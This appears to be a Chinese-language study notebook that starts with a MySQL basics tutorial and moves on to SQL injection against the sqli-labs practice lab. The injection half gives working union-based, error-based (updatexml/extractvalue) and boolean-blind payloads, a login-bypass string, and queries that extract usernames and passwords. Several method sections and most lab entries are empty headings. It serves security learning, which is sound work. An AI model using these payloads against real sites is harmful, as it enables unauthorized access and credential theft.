## MySQL数据库

一：MySQL命令不区分大小写，命令大写还是小写对其无影响

二：命令必须以结束符英文符号' ; '结尾

#### 	基础操作

* 修改数据库编码

  ```sql
  alter database 库名 character set utf8 ; #将数据库编码改为utf8
  ```

* 创建数据库

  ```sql
  CREATE DATABASE 数据库名
  ```

* 删除数据库

  ```sql
  DROP DATABASE 数据库名
  ```

* 查看所在库的表

  ```sql
  show tables;
  ```

* 创建表

  ```sql
  CREATE TABLE 表名称
  (
  列名称1 数据类型 约束条件,
  列名称2 数据类型,
  列名称3 数据类型,
  ....
  );
  ```

  * SQL中常用数据类型

    ![image20210818120044775.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/7/20/1629439713232.png?x-oss-process=style/ImageWaterMark_V1.0)

    ![image20210818120316362.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/7/20/1629439717568.png?x-oss-process=style/ImageWaterMark_V1.0)

    ![image20210818120325334.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/7/20/1629439722456.png?x-oss-process=style/ImageWaterMark_V1.0)

* 删除表

  ```sql
  DROP TABLE 表名
  ```

* 描述表结构

  ```sql
  desc 表名
  ```

#### SQL命令分类

```css
数据查询语言（DQL-Data Query Language）：针对表中的数据
	代表关键字：select（进行查询操作）
数据操纵语言（DML-Data Manipulation Language）：针对表中的数据
	代表关键字：insert（增加数据）,delete（删除数据）,update（改数据）
数据定义语言（DDL-Data Definition Language）：针对数据表的结构
	代表关键字：create（创建）,drop（删除）,alter（改动）
事务控制语言（TCL-Transactional Control Language）：拓展内容，了解即可
	代表关键字：commit（提交）,rollback（回滚）
数据控制语言（DCL-Data Control Language）：针对账户的权限管理
	代表关键字：grant,revoke.
```

#### SQL约束

可以在创建表时规定约束（通过 CREATE TABLE 语句），或者在表创建之后也可以（通过 ALTER TABLE 语句）增加或者修改

##### 	1、NOT NULL 

指示某列不能存储 NULL 值

```css
在默认的情况下，表的列接受 NULL 值
NOT NULL 约束强制列不接受 NULL 值
NOT NULL 约束强制字段始终包含值， 如果不向字段添加值，就无法插入新记录或者更新记录。
```

* 实例

  ```sql
  create table user(  
     id int not null,
     username varchar(20) not null,
     password varchar(30)
     );
  #插入数据
  insert into user (username) values('admin');
  
  insert into user (username) values(null);
  ```

  **not null是非空的约束**，也就是不能向表里插入NULL，现在向表里插入数据

  ```sql
  insert into user value（1,null,'123456');
  ```

  会报错，因为在建表时，username字段的约束条件是not null。

  **""空字符串不等同于null**， 我们向表里的username字段插入空字符串

  ```sql
  insert into user value（1,"","123456");
  ```

  是不会报错的，在MySQL里，""空字符串不是null，如果想要输入空值必须是null。**空值不占用空间，NULL占用空间**。

##### 2、UNIQUE  

保证某列的每行必须有唯一的值

```css
UNIQUE 约束唯一标识数据库表中的每条记录

UNIQUE 为列提供了唯一性的保证

PRIMARY KEY 拥有自动定义的 UNIQUE 约束

请注意，每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束
```

* 实例

  ```sql
  create table user2(  
     id int not null unique,
     username varchar(20) not null,
     password varchar(36) not null
     );
     
  insert into user values  (1,'a','a');
  ```

##### 3、PRIMARY KEY  

PRIMARY KEY 约束唯一标识数据库表中的每条记录，是NOT NULL 和 UNIQUE 的结合

```css
PRIMARY KEY 约束唯一标识数据库表中的每条记录

主键必须包含唯一的值

主键列不能包含 NULL 值

每个表都应该有一个主键，并且每个表只能有一个主键
```

* 实例

  ```sql
  create table user3(  
     id int not null,
     username varchar(20) not null,
     password varchar(36) not null,
     PRIMARY KEY (id)
     );
  ```

##### 4、DEFAULT 

给列增加默认值

```css
DEFAULT 约束用于向列中插入默认值

如果没有规定其他的值，那么会将默认值添加到所有的新记录
```

##### 5、AUTO INCREMENT

```css
当我们可以在插入新记录的时候，auto-increment 字段自动地创建主键字段的值
Auto-increment 会在新记录插入表中时生成一个唯一的数字
```

* 实例

  ```sql
  create table user5(  
     id int not null auto_increment,
     username varchar(20) not null,
     password varchar(36) not null,
     primary key (id)
     );
  ```

  使用 AUTO_INCREMENT 关键字来执行 auto-increment 任务，AUTO_INCREMENT 的初始值是 1，每新增一条新记录递增 1。

  要让 AUTO_INCREMENT 序列以其他的值起始

  ```sql
  ALTER TABLE user AUTO_INCREMENT=5
  ```



#### 数据增删改查

##### 	1、INSERT INTO增加

INSERT INTO 语句用于向表格中插入新的行。

```sql
INSERT INTO 
表名称 
VALUES 
(值1, 值2, ....),
(值3, 值4, ....),
(值5, 值6, ....);
```

指定所要插入数据的列

```sql
INSERT INTO 
表名称 
(列1, 列2, ...) 
VALUES 
(值1, 值2, ....);
```

##### 	2、DELETE FROM删除

DELETE 语句用于删除表中的行

```sql
#删除某行
DELETE FROM 表名 WHERE 列名 = 值
#删除整个表中数据（慎重）
DELETE FROM 表名
```

##### 	3、UPDATE SET修改

Update 语句用于修改表中的数据

```sql
UPDATE 表名 SET 列名 = 新值 WHERE 列名 = 数值
```

* 实例

  ```sql
  #修改第10行数据的，username为“admin2”
  update user set username = 'admin2' where id=10;
  
  #将username为“root”修改password为“root”
  update user set password = 'root' where username="root";
  
  #修改第11行数据，将username修改为“root”,password修改为“root”
  update user set username="root",password = 'root' where id=11;
  
  #修改整个表中的username为“root”（谨慎）
  update user set username="root";
  ```

##### 	4、ALTER TABLE 语句

ALTER TABLE 语句用于在已有的表中添加、删除或修改列

```sql
#在表中添加列
ALTER TABLE 表名 ADD 列名 datatype
#在表中删除列
ALTER TABLE 表名 DROP 列名
#修改数据类型
ALTER TABLE 表名 MODIFY COLUMN 列名 datatype
```

ALTER TABLE 语句可以修改数据表的名称，使用 RENAME 子句来实现

```sql
ALTER 表名 RENAME TO 新的表名;
```

##### 	5、ALTER 修改约束

```sql
#修改/增加字段默认值
ALTER TABLE 表名 ALTER 列名 SET DEFAULT 数值;
#删除字段默认值
ALTER TABLE 表名 ALTER 列名 DROP DEFAULT;
#添加 NOT NULL 约束
ALTER TABLE 表名 MODIFY 列名 NOT NULL/NULL;
#添加 PRIMARY KEY 约束
alter table user add primary key(id);
#删除 PRIMARY KEY 约束
alter table user drop primary key;

```

##### 	6、SELECT查询

```sql
SELECT * FROM test;                      /* 查询表所有数据 */
SELECT name FROM test;                   /* 查询表中name字段数据 */
SELECT * FROM test where name = "贵州";   /* 查询表test字段下符合条件的数据 */
SELECT * FROM test where id BETWEEN "1" AND "5";    /* 查询表下id字段符合范围的数据 */
SELECT * FROM test WHERE name in ("贵州","广西","哪个牛批");    /* 查询表字段下固定条件数据 */
SELECT DISTINCT country FROM test;                  /* 查询并且去除相同的结果，即去重值 */
SELECT * FROM test WHERE country = "CN" AND alexa > 50;  /*查询表下范围条件数据*/
SELECT * FROM test WHERE country = "USA" OR country="sh"; /* 查询表下条件不同值 */
SELECT * FROM test ORDER BY alexa;                      /* 查询表下值排序结果 */
SELECT * FROM test ORDER BY alexa DESC;                 /* 查询表下排序结果降序 */
```

* SELECT DISTINCT

  在表中，一个列可能会包含多个重复值，DISTINCT 关键词用于返回唯一不同的值。

  ```sql
  SELECT DISTINCT 列名 FROM 表名;
  ```

  * 实例

    ```sql
    #插入一行数据，重复username的数据
    mysql>insert into test.user (username,password) values('admin','12345678');
    #查询user表中username列的数据
    mysql>select username from test.user;
    #查询user表中username列去重后的数据
    mysql>select distinct username from test.user;
    ```

* LIKE的使用

  ```css
  LIKE模糊匹配关键字。
  %：表示任意个或多个字符，可匹配任意类型和长度的字符。
  a%：表示以a开头的信息
  %b：表示以b结尾的信息
  %a%：表示包含a的信息
  a%b：表示以a开头，b结尾的信息
  _：表示一个字符
  ```

  * 实例

    ```sql
    # 查找不包含“oo”的password信息
    使用 NOT 关键字来实现
    select * from test.user where password not like '%oo%';
    ```

* BETWEEN的使用

  * 实例

  ```sql
  #选取id介于1-3之间的信息
  select * from test.user where id between 1 and 3;
  ```

---



## MySQL注入

### MySQL相关知识点

##### 1、注释风格

```sql
“#” 							(url编码为%23)
“--“							(--后边要跟上一个或多个空格,”+” 在URL中会被当做空格，因此可以使用--+来进行注释。) 
“/* ..... */” 					常用于替换空格
“/*! .... */”					内敛注释（在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行）
```

##### 2、information_schema数据库

其中三张表：

SCHEMATA表存储用户创建的所有数据库的库名，数据库名字段为==SCHEMA_NAME==。

TABLES表存储用户创建的所有数据库的库名和表名，数据库名和表名字段为==TABLE_SCHEMA==和==TABLE_NAME==。

COLUMNS表存储用户创建的所有数据库名、表名和字段名，数据库名、表名、字段名字段分别为==TABLE_SCHEMA==、==TABLE_NAME==、==COLUMN_NAME==。

##### 3、MySQL数据库基本函数

```sql
#MySQL数据库版本 	version()
#数据库用户名   		user()
#当前数据库名		database()
#数据库安装路径	 @@basedir
#数据库文件存放路径	@@datadir
#操作系统版本		  @@version_compile_os
```

##### 4、连接字符串函数

###### 4.1函数concat()

语法：concat(str1,str2,…)
拼接字符串，直接拼接，字符之间没有符号

###### 4.2函数concat_ws()

语法：concat_ws(separator, str1, str2, …)
指定符号进行拼接，第一个参数是分隔符

###### 4.3函数group_concat()

语法group_concat(username)
将username中的内容以逗号隔开显示出来，回显认为为一个单位

##### 5、常用关键字

###### 5.1 substr()

三个参数，按顺序分别是字符串，起始位置和长度。效果为截取查询结果的第几个到第几个字母。

###### 5.2 ord()

该函数用于获得某个字符串最开始的字符的ASCII值。

###### 5.3 ascii()

返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL
作用跟ord几乎一样，如果ord被过滤，也可以用acii代替

###### 5.4 limit和offset

limit 0会得到空集合
		limit大于查询结果返回的行数时，显示全部结果
		limit负值会报错

###### 5.5 left()

从左边开始读，输出字符串的几个字符。第一个参数为要读取的字符串，第二个参数为读取字符的长度。

###### 5.6 right()

和left()相反，从右边开始读，读几个字符。

###### 5.7 elt()

```css
elt(n,str1,str2,str3);返回参数中的第n个字符串,参数可以是字符串常量或者列名
```

###### 5.8 rand()

该函数用于产生一个随机数，可以接受一个参数作为种子，也可以直接使用。

###### 5.9 floor()

该函数用于将一个浮点数向下取整得到整数，可以与rand函数配合使用。在特定情况下，rand、floor、count(*)配合group by可以进行报错注入。

###### 5.10 exp()

这是一个数学函数，可以求e的多少次幂，当参数过大时会因为溢出而报错。使用该函数时，通常将查询结果取反以便得到一个非常大的数。用法如下：

```sql
select exp(~(select*from(select user())x));
=>DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
```

###### 5.11 hex()

这个函数主要用于获取字符串对应的十六进制值。

###### 5.12 mid()

该函数可以从指定的字段中提取出字段的内容。

```sql
mid(column_name,start[,length])
```

###### 5.13 sleep()

该函数的参数是一个整数T，可以在执行某操作后延迟T秒而不进行任何操作。

该函数常用于处理没有回显的SQL注入，根据响应的时间来确定被注入的SQL语句是否执行成功了。

注：该函数是作用于服务器端，服务器端执行后将查询结果延迟T秒后再发送给请求端

###### 5.14 length()

该函数的参数可以是字符串，或者列名。该函数的作用是获取字符串的长度。

### 	注入原理

​	产生原因：当web应用程序向数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，攻击者可以构造特殊的SQL语句，直接输入到数据库引擎执行获取甚至修改数据库中的数据。

​	本质：将数据当成代码来执行，违背"数据与代码"的原则。

关键点

- 用户能够控制输入的内容
- web应用能够把用户输入的内容带入数据库执行

   危害：盗取网站信息;绕过后台的登录认证

```sql
select * from user where username = '$user'and password ='$pass' ###后台登录逻辑
select * from user where username = ''or '1'='1'#'and password ='$password' ###万能密码：'or '1'='1'#
```

### 		 注入流程

##### 	1、寻找注入点

1.1、sql跟数据库相关，与数据库有交互的地方 :注册、登录、搜索、修改信息

​                  格式为？xx=yyy（谷歌搜索语法）

1.2、判断闭合方式和数据类型

* **数字型**
* **字符型**
* **闭合方式**：以确保代码注入后的语法正确

1.3、判断列数和回显位

- 列数判断：order by 1等价于order by 第一列

  ```sql
  http://127.0.0.1:82/Less-1/?id=1' order by 4--+  
  ```

- 回显位判断：union

  - 回显即回馈显现，limit x，y（x为偏移位，y为输出行数）

  
     - union前后select的列数要一致（列数判断的原因）
  

* 取数据

  * 获取数据库名：security

  * 根据库名查表名:emails,referers,uagents,users
  
    ```sql
  ?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+
    ```

  * 查列名:id,username,password

    ```sql
    id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),3--+
    ```

  * 查具体数据：如 username

    ```sql
    id=-1' union select 1,(select group_concat(username) from users),3--+
    ```

### 注入方法

#### 	法一：联合查询

##### 1、判断数据类型

```css
?id=1 and 1=1; 正常

?id=1 and 1=2; 正常，结合1=1得出数据类型不是整型

?id=1'; 报错，可能为字符型

?id=1' %23; 正常，可以确认数据类型为字符型。%23为注释符#的意思，注释掉后面的语句，也可以用?id=1' --+来注释。

?id=1' and '1'='1; 正常，使用【'】闭合语句，select *from users where id='1''and '1'=1;这里的'1'=1意思是'1'这种形式输入的参数是否为1(即Bool类型True)，输入格式正确就会返回正常。
```

##### 2、查询列数

```css
?id=1' order by 3 --+ 正常，列数>=3

?id=1' order by 4 --+ 报错，确认列数为3列
```

##### 3、确认显示位

```sql
?id=-1' union select 1,2,3 --+		正常，联合查询注入即union select，由于列数为3列，所以我们允许同时查询三个语句
```

##### 4、查询数据库信息

```sql
?id=-1' union select 1,version(),database()--+
```

##### 5、查询数据库

这里有两种选择，一种是查询当前数据库，然后查询当前数据库内的表、列、数据；一种是爆破出所有数据库名，再选择数据库去查询其中的表、列、数据。

5.1、查询当前数据库和其中表

```sql
?id=-1' union select 1,2,database() --+

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

5.2、爆破所有数据库

```sql
?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+
```

##### 6、爆破数据库中的表

```
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+               #同上 5.1
```

##### 7、爆破表中的字段

```sql
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security'  and table_name='users' --+
```

##### 8、查询具体数据

```sql
?id=-1' union select 1,2,group_concat(username,password) from users --+
```

* 优化语句：添加区分语句，如添加_、：、@、空格等等

  ```sql
  ?id=-1' union select 1,2,group_concat(username,'_',password) from users --+
  ```

* 给结果换行，把换行符%0x<br》  经过hex编码后的0x3c62723e输入，SEPARATOR为拆分命令，可让每条结果都互相拆开

  ```sql
  ?id=-1' union select 1,2,(select group_concat(username,'@',password separator 0x3c62723e) from users)--+
  ```

#### 法二：报错注入

##### 1、注入点判断

判断方式和联合查询注入一样，不同在于发现存在报错信息，所以可以使用报错注入。类似于下方的报错信息：

![image-20231127215426197](../../../Git/NOTE/渗透学习笔记/SQL注入/image-20231127215426197.png)

##### 2、错误回显利用

###### 2.1xpath报错注入

当这两个函数在执行时，如果出现xml文档路径错误就会产生报错。

* updatexml()函数

  例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。

  ```css
  updatexml(xml_doument,XPath_string,new_value)
  第一个参数：XML_document是String格式					   #XML文档对象的名称
  第二个参数：XPath_string (Xpath格式的字符串)。			#需要更新的位置XPATH路径，当格式出现错误，MySQL爆出														  xpath语法错误（xpath syntax）
  第三个参数：new_value，String格式，替换查找到的符合条件的数据   				#更新后的内容
  ```

  构造payload去触发Xpath语法错误，0x7e->'~' 来触发

  ```sql
  ?id=1' and updatexml(1,concat(0x7e,version()),1) --+      #查询版本
  ?id=1'and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),0)--+  										#查询数据库名
  
  ?id=1' and updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata),0x7e),1) --+      #   爆所有数据库
  
  ?id=1'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='mysql'limit 0,1)),0)--+                #查询表名
  ```

  updatexml函数最多输出==32==个字节，~的存在占据一位，密文只有31位，可以使用substring（）函数截断

  ```css
  substring(xx,xx)
  一个是要截取的内容，一个是开始的位数
  ```

* extractvalue()函数

  跟updatexml()函数类似，只是不需要第三个参数

  ```sql
  1' and extractvalue(1,concat(0x5c,version(),0x5c))#    爆版本
  1' and extractvalue(1,concat(0x5c,database(),0x5c))#   爆数据库
  
  1' and extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c))#   爆表名
  
  1' and extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x5c))# 爆字段名
   
  1' and extractvalue(1,concat(0x5c,(select password from (select password from users where username='admin1') b) ,0x5c))            # 爆字段内容该格式针对mysql数据库。
  
  1' and extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c))                    										#爆字段内容。
  ```

###### 2.2其他报错注入方式

https://blog.csdn.net/rfrder/article/details/108674217

#### 法三：布尔盲注

常规盲注费时费力，可以尝试脚本或猜解0000

##### 1、注入点

只有根据数据的True和False显示不同的页面状况，没有显示位。

##### 2、判断显示位

```sql
?id=-1 and -1=-2 union select 1,2 --+ 			页面错误，无返回信息
```

##### 3、爆破当前数据库

###### 	3.1、数据库长度

```sql
?id=1' and (length(database()))>4 --+	#长度大于4
```

###### 	3.2、数据库名称

```sql
?id=1' and left(database(),1)='s'--+  	#第一个字符为s
```

#### 法四：时间盲注

#### 法五：堆叠查询

#### 法六：二次注入

#### 法七：宽字节注入

#### 法九：Cookie注入

#### 法十：Base64注入

#### 法十一：XFF注入

#### 	疑惑点

##### 1、关于将id值设置为0或者负数的解释

 UNION的作用是将两个select查询结果合并，以union关键字分隔，而程序在展示数据的时候通常只会取结果集的第一行数据，这就让联合注入有了利用的点。当我们查询的第一行是不存在的时候就会回显第二行给我们。将查询的数据置为-1，那第一行的数据为空，第二行自然就变为了第一行。

##### 2、SELECT 1,2,3...的含义及注入中用法

select直接加数字串时，可以不写后面的表名，那么它输出的内容就是我们select后的数字，这时我们写的一串数字就是一个数组（或1个行向量），这时select实际上没有向任何一个数据库查询数据，即查询命令不指向任何数据库的表。返回值就是这个数组，这时它是个1行n列的表，表的属性名和值都是我们输入的数组，如图：

![image-20231124140142998](../../../Git/NOTE/渗透学习笔记/SQL注入/image-20231124140142998.png)

返回表的列数是等于我们输入的数字个数的，而行数与原数据库表的结构保持一致，原本有3行数据，输入数字串后仍为3行。

---



## Sqli-labs靶场

### Less-1

```css
请求方式：GET
注入类型：联合、报错、布尔盲注、时间盲注
拼接方式：id='$id
```

### 	Less-2

### 	Less-3

### 	Less-4

### 	Less-5

### 	Less-6

### 	Less-7

### 	Less-8

### 	Less-9

### 	Less-10

### 	Less-11

### 	Less-12

### 	Less-13

### 	Less-14

### 	Less-15

